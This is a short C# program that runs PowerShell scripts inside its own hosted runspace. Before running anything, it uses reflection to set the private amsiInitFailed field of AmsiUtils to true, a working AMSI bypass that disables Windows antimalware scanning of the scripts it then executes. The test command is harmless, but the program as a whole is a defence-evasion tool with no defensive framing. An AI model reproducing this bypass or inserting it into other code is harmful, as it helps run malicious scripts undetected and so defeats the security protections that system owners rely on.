using System;
using System.Text;
using System.Reflection;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;


namespace PwSh
{
    class Program
    {
        private static string RunScript(string psScript)
        {
            var retStr = String.Empty;

            foreach (var assembly in AppDomain.CurrentDomain.GetAssemblies())
            {
                if (assembly.GetName().Name == "System.Management.Automation")
                {
                    foreach (var type in assembly.GetTypes())
                    {
                        if (type.FullName == "System.Management.Automation.AmsiUtils")
                        {
                            type.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static).SetValue(null, true);
                        }
                    }
                }
            };

            using (Runspace runspace = RunspaceFactory.CreateRunspace())
            {
                runspace.ApartmentState = System.Threading.ApartmentState.STA;
                runspace.Open();

                using (PowerShell powerShell = PowerShell.Create())
                {
                    powerShell.AddScript(psScript);
                    powerShell.AddCommand("Out-String");
                    Collection<PSObject> psObjects;
                    try
                    {
                        psObjects = powerShell.Invoke();
                    }
                    catch (Exception e)
                    {
                        return e.ToString();
                    }
                    StringBuilder stringBuilder = new StringBuilder();
                    foreach (var item in psObjects)
                    {
                        stringBuilder.AppendLine(item.BaseObject.ToString());
                    }
                    retStr = stringBuilder.ToString();
                }
            }
            return retStr;
        }
        static void Main(string[] args)
        {
            //var pwshCmd = "echo 'System.Management.Automation.AmsiUtils'";
            var pwshCmd = "echo 'test'";
            Console.WriteLine(RunScript(pwshCmd));
        }
    }
}
